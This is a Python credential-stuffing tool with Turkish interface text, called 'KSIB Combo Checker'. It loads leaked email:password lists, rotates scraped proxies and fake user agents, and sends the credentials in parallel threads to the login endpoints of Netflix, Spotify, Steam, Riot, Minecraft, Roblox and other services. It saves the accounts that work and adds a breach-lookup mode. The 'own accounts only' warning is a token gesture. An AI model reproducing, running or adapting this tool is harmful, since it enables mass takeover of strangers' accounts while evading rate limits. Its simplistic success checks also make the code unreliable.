#!/usr/bin/env python3
# KSIB COMBO CHECKER + BREACH SEARCH v1.0 ULTRA
import requests, threading, random, time, sys, os, json, re
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            time.sleep(1)
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class UltraComboChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.combo_list = []
        self.working = []
        self.dead = []
        self.breach_results = []
        self.lock = threading.Lock()
        self.checked = 0
        self.working_count = 0
        self.dead_count = 0
        self.start_time = None
        self.running = True
        
        # PROXY havuzu
        self.proxies = []
        self.proxy_index = 0
        
        # Kontrol edilecek servisler
        self.services = {
            "netflix": {
                "name": "Netflix",
                "url": "https://www.netflix.com/api/v1/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🎬"
            },
            "spotify": {
                "name": "Spotify",
                "url": "https://accounts.spotify.com/api/login",
                "method": "post",
                "check": lambda r: r.status_code == 200 and "access_token" in r.text,
                "icon": "🎵"
            },
            "steam": {
                "name": "Steam",
                "url": "https://store.steampowered.com/login/dologin/",
                "method": "post",
                "check": lambda r: r.status_code == 200 and "success" in r.text,
                "icon": "🎮"
            },
            "riot": {
                "name": "Riot Games",
                "url": "https://auth.riotgames.com/api/v1/authorization",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🎯"
            },
            "epic": {
                "name": "Epic Games",
                "url": "https://www.epicgames.com/id/api/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🎪"
            },
            "ubisoft": {
                "name": "Ubisoft",
                "url": "https://connect.ubisoft.com/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🗡️"
            },
            "origin": {
                "name": "EA Origin",
                "url": "https://accounts.ea.com/connect/auth",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "⚽"
            },
            "hulu": {
                "name": "Hulu",
                "url": "https://auth.hulu.com/v1/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "📺"
            },
            "disney": {
                "name": "Disney+",
                "url": "https://www.disneyplus.com/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🏰"
            },
            "prime": {
                "name": "Amazon Prime",
                "url": "https://www.amazon.com/ap/signin",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "📦"
            },
            "minecraft": {
                "name": "Minecraft",
                "url": "https://authserver.mojang.com/authenticate",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "⛏️"
            },
            "roblox": {
                "name": "Roblox",
                "url": "https://auth.roblox.com/v2/login",
                "method": "post",
                "check": lambda r: r.status_code == 200,
                "icon": "🎲"
            },
        }
        
        # Breach kontrol API'leri
        self.breach_apis = [
            "https://haveibeenpwned.com/api/v3/breachedaccount/{}",
            "https://leakcheck.io/api/public?check={}",
            "https://api.proxynova.com/comb?query={}",
        ]
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + Style.BRIGHT + """
        ╔══════════════════════════════════════════════╗
        ║  🔥 KSIB COMBO CHECKER ULTRA              ║
        ║  🎬 Netflix | 🎵 Spotify | 🎮 Steam        ║
        ║  🎯 Riot | 🎪 Epic | ⛏️ Minecraft          ║
        ║  🩸 Data Breach Search | 📊 Export         ║
        ╚══════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def load_combo(self, filepath):
        """Combo listesini yükle"""
        print(Fore.YELLOW + f"\n📂 Combo list yükleniyor: {filepath}")
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            for line in lines:
                line = line.strip()
                if ':' in line and '@' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        email = parts[0]
                        password = ':'.join(parts[1:])  # Şifrede : olabilir
                        self.combo_list.append({
                            'email': email,
                            'password': password,
                            'raw': line
                        })
            
            print(Fore.GREEN + f"✅ {len(self.combo_list)} combo yüklendi!")
            return len(self.combo_list)
        
        except Exception as e:
            print(Fore.RED + f"❌ Hata: {e}")
            return 0
    
    def load_proxies(self, filepath=None):
        """Proxy yükle"""
        if filepath and os.path.exists(filepath):
            with open(filepath, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"✅ {len(self.proxies)} proxy yüklendi!")
        else:
            # Bedava proxy çek
            try:
                urls = [
                    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
                    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                ]
                for url in urls:
                    r = requests.get(url, timeout=10)
                    if r.status_code == 200:
                        self.proxies.extend([p for p in r.text.split('\n') if p.strip()])
                
                print(Fore.GREEN + f"✅ {len(self.proxies)} bedava proxy çekildi!")
            except:
                print(Fore.YELLOW + "⚠️ Proxy bulunamadı, proxiesiz devam...")
    
    def get_proxy(self):
        """Sıradaki proxy'i al"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    def check_service(self, service_key, email, password):
        """Belirli bir serviste hesabı kontrol et"""
        service = self.services[service_key]
        
        try:
            headers = {
                "User-Agent": self.ua.random,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
            }
            
            # Servise özel data
            if service_key == "netflix":
                data = {"email": email, "password": password}
            elif service_key == "spotify":
                data = {"username": email, "password": password, "grant_type": "password"}
            elif service_key == "steam":
                data = {"username": email, "password": password, "emailauth": ""}
            elif service_key == "riot":
                data = {"username": email, "password": password, "type": "auth"}
            elif service_key == "minecraft":
                data = {"username": email, "password": password, "agent": {"name": "Minecraft", "version": 1}}
            else:
                data = {"email": email, "password": password}
            
            proxy = self.get_proxy()
            
            if service["method"] == "post":
                r = requests.post(service["url"], json=data, headers=headers, 
                                proxies=proxy, timeout=10, verify=False)
            else:
                r = requests.get(service["url"], headers=headers, 
                               proxies=proxy, timeout=10, verify=False)
            
            if service["check"](r):
                return True, service["icon"], service["name"]
            return False, None, None
            
        except:
            return False, None, None
    
    def check_breach(self, email):
        """Email'in veri ihlallerinde olup olmadığını kontrol et"""
        breaches = []
        
        # HaveIBeenPwned
        try:
            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
            headers = {"hibp-api-key": "0", "User-Agent": "KSIB-ComboChecker"}
            r = requests.get(url, headers=headers, timeout=10)
            
            if r.status_code == 200:
                for breach in r.json():
                    breaches.append({
                        "kaynak": "HIBP",
                        "site": breach.get("Name", "?"),
                        "tarih": breach.get("BreachDate", "?"),
                        "veri": ", ".join(breach.get("DataClasses", []))
                    })
        except:
            pass
        
        # LeakCheck
        try:
            url = f"https://leakcheck.io/api/public?check={email}"
            r = requests.get(url, timeout=10)
            if r.status_code == 200 and r.json().get("success"):
                for source in r.json().get("sources", []):
                    breaches.append({
                        "kaynak": "LeakCheck",
                        "site": source.get("name", "?"),
                        "tarih": source.get("date", "?"),
                        "veri": f"{source.get('lines', '?')} kayıt"
                    })
        except:
            pass
        
        return breaches
    
    def worker(self, service_key, thread_id):
        """İşçi thread"""
        while self.running and self.checked < len(self.combo_list):
            # Sıradaki combo'yu al
            index = self.checked
            if index >= len(self.combo_list):
                break
            
            with self.lock:
                self.checked += 1
            
            combo = self.combo_list[index]
            email = combo['email']
            password = combo['password']
            
            # Servisi kontrol et
            success, icon, service_name = self.check_service(service_key, email, password)
            
            with self.lock:
                if success:
                    self.working_count += 1
                    self.working.append({
                        'email': email,
                        'password': password,
                        'service': service_name,
                        'icon': icon,
                        'raw': combo['raw']
                    })
                    
                    print(Fore.GREEN + f"  {icon} [{service_name}] ✅ {email}:{password[:10]}...")
                    
                    # Çalışanı hemen kaydet
                    self.save_single(email, password, service_name)
                else:
                    self.dead_count += 1
                    if self.checked % 50 == 0:
                        print(Fore.RED + f"  ❌ Kontrol edilen: {self.checked}/{len(self.combo_list)} | "
                              f"✅{self.working_count} | ❌{self.dead_count}")
                
                # İlerleme çubuğu
                if self.checked % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.checked / elapsed if elapsed > 0 else 0
                    eta = (len(self.combo_list) - self.checked) / rate if rate > 0 else 0
                    print(Fore.CYAN + f"\n  📊 {self.checked}/{len(self.combo_list)} | "
                          f"⚡{rate:.1f}/s | ⏳{eta:.0f}s | ✅{self.working_count}\n")
            
            time.sleep(random.uniform(0.1, 0.5))
    
    def save_single(self, email, password, service):
        """Çalışan hesabı anında kaydet"""
        with open("working_accounts.txt", 'a', encoding='utf-8') as f:
            f.write(f"[{service}] {email}:{password}\n")
    
    def save_results(self):
        """Tüm sonuçları kaydet"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # TXT olarak
        with open(f"working_{timestamp}.txt", 'w', encoding='utf-8') as f:
            f.write("="*50 + "\n")
            f.write("KSIB COMBO CHECKER - ÇALIŞAN HESAPLAR\n")
            f.write("="*50 + "\n\n")
            for acc in self.working:
                f.write(f"[{acc['service']}] {acc['email']}:{acc['password']}\n")
        
        # JSON olarak
        with open(f"results_{timestamp}.json", 'w', encoding='utf-8') as f:
            json.dump(self.working, f, indent=2, ensure_ascii=False)
        
        print(Fore.GREEN + f"\n💾 Kaydedildi: working_{timestamp}.txt")
        print(Fore.GREEN + f"💾 Kaydedildi: results_{timestamp}.json")
    
    def breach_search_mode(self, email):
        """Email breach arama modu"""
        print(Fore.CYAN + f"\n🩸 DATA BREACH SEARCH: {email}\n")
        
        breaches = self.check_breach(email)
        
        if breaches:
            print(Fore.RED + f"⚠️ {len(breaches)} VERİ İHLALİ BULUNDU!\n")
            for i, breach in enumerate(breaches, 1):
                print(Fore.YELLOW + f"  [{i}] {breach['site']}")
                print(Fore.WHITE + f"      📅 Tarih: {breach['tarih']}")
                print(Fore.WHITE + f"      📋 Sızan veri: {breach['veri']}")
                print(Fore.WHITE + f"      🔍 Kaynak: {breach['kaynak']}")
        else:
            print(Fore.GREEN + "✅ Hiçbir veri ihlalinde bulunamadı!")
        
        return breaches
    
    def start_checking(self, service_key, threads=10):
        """Combo kontrolü başlat"""
        if not self.combo_list:
            print(Fore.RED + "❌ Önce combo list yükle!")
            return
        
        service = self.services[service_key]
        
        print(Fore.CYAN + f"\n🎯 Hedef Servis: {service['icon']} {service['name']}")
        print(Fore.CYAN + f"📊 Toplam Combo: {len(self.combo_list)}")
        print(Fore.CYAN + f"🧵 Thread: {threads}")
        print(Fore.YELLOW + "💡 Proxy kullanmak için önce proxy yükle!")
        print(Fore.RED + "\n💣 KONTROL BAŞLATILIYOR...\n")
        
        self.start_time = time.time()
        
        # Thread'leri başlat
        tl = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(service_key, i))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n\n[!] Durduruldu!")
        
        # Sonuçlar
        elapsed = time.time() - self.start_time
        rate = self.checked / elapsed if elapsed > 0 else 0
        
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + f"📊 {service['name']} SONUÇLARI")
        print("="*60)
        print(f"⏱️  Süre: {elapsed:.1f}s ({elapsed/60:.1f}dk)")
        print(f"📨 Kontrol edilen: {self.checked}/{len(self.combo_list)}")
        print(f"✅ Çalışan: {self.working_count}")
        print(f"❌ Çalışmayan: {self.dead_count}")
        if self.checked > 0:
            print(f"📈 Başarı Oranı: %{self.working_count/self.checked*100:.2f}")
        print(f"⚡ Hız: {rate:.1f}/s")
        print("="*60)
        
        if self.working:
            print(Fore.YELLOW + f"\n🎯 ÇALIŞAN HESAPLAR ({len(self.working)}):")
            for acc in self.working[:20]:
                print(Fore.GREEN + f"  {acc['icon']} {acc['email']}:{acc['password'][:15]}...")
            
            if len(self.working) > 20:
                print(Fore.WHITE + f"  ... ve {len(self.working)-20} tane daha!")
            
            # Kaydet
            print(Fore.YELLOW + "\n💾 Sonuçlar kaydedilsin mi?")
            if input(Fore.GREEN + "(E/H): ").upper() == 'E':
                self.save_results()
        
        print(Fore.YELLOW + "="*60 + "\n")

def ana():
    giris()
    checker = UltraComboChecker()
    checker.bnr()
    
    print(Fore.YELLOW + "\n🎮 MOD SEÇİN:")
    print("1. 🔥 COMBO CHECKER (Combo list kontrol)")
    print("2. 🩸 BREACH SEARCH (Email ihlal kontrolü)")
    print("3. 🔄 İKİSİ BİRDEN")
    
    mod = input(Fore.GREEN + "\nSeçim: ")
    
    if mod in ["1", "3"]:
        # Combo list yükle
        print(Fore.YELLOW + "\n📂 COMBO LİST DOSYASI:")
        print(Fore.CYAN + "Örnek: combo.txt (email:şifre formatında)")
        filepath = input(Fore.GREEN + "Dosya yolu: ").strip()
        
        if not os.path.exists(filepath):
            print(Fore.RED + "❌ Dosya bulunamadı!")
            return
        
        checker.load_combo(filepath)
        
        # Proxy yükle (opsiyonel)
        print(Fore.YELLOW + "\n🌐 PROXY DOSYASI (opsiyonel):")
        proxy_file = input(Fore.GREEN + "Dosya yolu (boş bırakabilirsin): ").strip()
        if proxy_file:
            checker.load_proxies(proxy_file)
        
        # Servis seç
        print(Fore.YELLOW + "\n🎯 HEDEF SERVİS:")
        for key, service in checker.services.items():
            print(Fore.CYAN + f"  {service['icon']} {service['name']} ({key})")
        
        service_key = input(Fore.GREEN + "\nServis adı: ").lower()
        
        if service_key not in checker.services:
            print(Fore.RED + "❌ Geçersiz servis!")
            return
        
        # Thread
        threads = int(input(Fore.GREEN + "🧵 Thread (10): ") or "10")
        
        print(Fore.RED + "\n⚠️ YASAL UYARI: Sadece kendi hesaplarınızı test edin!")
        if input(Fore.GREEN + "🚀 Başlat? (E/H): ").upper() == 'E':
            checker.start_checking(service_key, threads)
    
    if mod in ["2", "3"]:
        # Breach search
        print(Fore.YELLOW + "\n🩸 BREACH SEARCH:")
        email = input(Fore.GREEN + "📧 Email: ").strip()
        if '@' in email:
            checker.breach_search_mode(email)
    
    if mod == "3":
        print(Fore.YELLOW + "\n✅ Tüm işlemler tamamlandı!")

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
